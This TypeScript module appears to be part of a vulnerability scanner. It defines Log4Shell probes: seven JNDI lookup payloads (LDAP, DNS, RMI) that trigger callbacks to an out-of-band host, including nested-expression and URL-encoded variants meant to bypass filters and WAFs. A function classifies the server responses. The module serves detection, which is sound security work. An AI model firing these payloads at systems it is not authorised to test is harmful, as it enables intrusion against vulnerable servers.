// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'log4shell',
  family: 'cve-named',
  title: 'Log4Shell CVE-2021-44228 / CVE-2021-45046',
  severity: 'critical',
  destructiveRisk: 'none',
  requiresOast: true,
  requiresBrowser: false,
  insertionPointKinds: ['header', 'query', 'body', 'json', 'cookie'],
  expectedSignals: ['oast-callback-confirmed', 'error-disclosure'],
  cwe: [917],
};

export function variants(ctx: ProbeContext): PayloadVariant[] {
  const oastHost = ctx.oastBaseUrl ? new URL(ctx.oastBaseUrl).hostname : 'oast.pf.example';
  return [
    {
      id: 'log4j-jndi-ldap',
      family: 'cve-named',
      value: `\${jndi:ldap://${oastHost}/pf-log4j}`,
      encoding: 'raw',
      intent: 'Log4Shell JNDI LDAP lookup — triggers DNS+LDAP OAST callback',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'log4j-jndi-dns',
      family: 'cve-named',
      value: `\${jndi:dns://${oastHost}/pf-log4j-dns}`,
      encoding: 'raw',
      intent: 'Log4Shell JNDI DNS lookup variant',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'log4j-upper-bypass',
      family: 'cve-named',
      value: `\${j\${upper:n}di:ldap://${oastHost}/pf-log4j-ub}`,
      encoding: 'raw',
      intent: 'Log4j nested expression bypass using ${upper:n}',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'log4j-lower-bypass',
      family: 'cve-named',
      value: `\${j\${lower:N}di:ldap://${oastHost}/pf-log4j-lb}`,
      encoding: 'raw',
      intent: 'Log4j nested expression bypass using ${lower:N}',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'log4j-cve-45046',
      family: 'cve-named',
      value: `\${j\${::-n}\${::-d}i:rmi://${oastHost}/pf-45046}`,
      encoding: 'raw',
      intent: 'CVE-2021-45046 context lookup bypass via RMI',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'log4j-url-encoded',
      family: 'cve-named',
      value: encodeURIComponent(`\${jndi:ldap://${oastHost}/pf-log4j-url}`),
      encoding: 'url',
      intent: 'Log4Shell URL-encoded — for WAF bypass via query parameter insertion',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'log4j-header-x-api-version',
      family: 'cve-named',
      value: `\${jndi:ldap://${oastHost}/pf-log4j-api}`,
      encoding: 'header-safe',
      intent: 'Log4Shell via X-Api-Version header (commonly logged by Java APIs)',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
  ];
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  _baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  const responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.15;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  // Log4Shell is exclusively OAST-confirmed — no inline oracle possible
  evidence.push(`Log4Shell JNDI probe dispatched via ${variant.id} — awaiting LDAP/DNS/RMI OAST callback`);
  confidence = 0.15;
  nextAction = 'continue';

  // Secondary signal: Java stack trace may appear in error responses
  if (resp.bodyText.toLowerCase().includes('jndi') || resp.bodyText.includes('NamingException')) {
    evidence.push('JNDI-related error in response — Log4j logging confirmed, OAST callback expected');
    confidence = 0.5;
    nextAction = 'confirm';
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
